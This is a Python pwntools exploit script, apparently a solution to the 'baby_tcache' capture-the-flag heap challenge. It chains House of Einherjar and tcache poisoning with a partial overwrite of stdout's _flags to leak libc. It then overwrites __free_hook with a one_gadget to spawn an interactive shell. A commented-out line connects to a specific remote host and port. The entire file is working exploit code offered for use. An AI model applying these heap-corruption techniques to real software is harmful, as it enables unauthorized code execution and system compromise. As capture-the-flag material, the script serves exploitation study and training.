from pwn import *

p = process("./baby_tcache") #env={'LD_PRELOAD' : './libc.so.6'})
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#s=remote("52.68.236.186", 56746)


def add(size,data,val=1):
        p.recvuntil("Your choice: ")
        p.sendline(str(1))
        p.recvuntil("Size:")
        p.sendline(str(size))
        ret = p.recvuntil("Data:",timeout=5)
        if ret == "":
            exit()
        if(val):
            p.sendline((data))
        else:
            p.send((data))

def free(idx):
        p.recvuntil("Your choice: ")
        p.sendline(str(2))
        p.recvuntil("Index:")
        p.sendline(str(idx))

# House of einhejar

add(0x4f0,"a"*0x8,1)
add(0x60,"b"*8)
add(0x30,"a"*8)
add(0x10,"a"*8)
add(0x4f0,"b"*8,0)
add(0x10,"a"*8)

# free and allocate ptr_3 to overwrite prev_size and clear prev\_inuse bit of ptr_4

free(3)
add(0x18,p64(0x00) *2 + p64(0x5d0),0)


# trigger house of einhejar
 
free(0)
free(4)

# free two ptr_1 and ptr_3 so they can be used to corrupt tcache and get arbitary allocations

free(1)
free(3)

# allocate ptr_1 to get UAF on ptr_1


add(0x4f0,"a")

# partial overwrite to stdout->_flags

add(0x90,b"\x60\x07",0)

# Overwrite _flags and _IO_write_base to get leak


add(0x60,"w")
add(0x60,p64(0xfbad1800) + p64(0x00)*3 + b"\x00",1)

libc_leak=u64(p.recv(6)+b"\x00\x00")-0x3ebff0
log.info(hex(libc_leak))
free_hook=libc_leak + libc.symbols['__free_hook']
system=libc_leak + libc.symbols['system']
one_gadget = libc_leak+0x4f432

# Allocate another size such that it is serviced from the unsorted bin to get UAF on ptr_3

# Corrupt fd with __free_hook, allocate and overwrite with one_gadget


add(0x400,p64(0x00)*2 +p64(free_hook))

add(0x10,"a")
add(0x10,p64(one_gadget),1)
pause()
free(0)

p.interactive()
